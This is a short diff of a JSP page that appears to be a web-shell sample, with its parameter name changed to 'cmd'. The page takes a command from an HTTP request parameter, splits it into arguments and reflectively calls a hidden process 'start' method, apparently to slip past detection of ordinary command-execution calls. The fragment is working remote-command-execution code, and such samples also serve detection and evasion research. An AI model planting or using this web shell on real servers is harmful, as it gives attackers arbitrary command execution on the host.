@@ -16,7 +16,7 @@
     }
 %>
 <%
-    String s = request.getParameter("threedr3am");
+    String s = request.getParameter("cmd");
     Threedr3am_9.ooo = new Object[]{s.split(" "), null, null, null, false};
     Method method = Threedr3am_9.clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
     method.setAccessible(true);
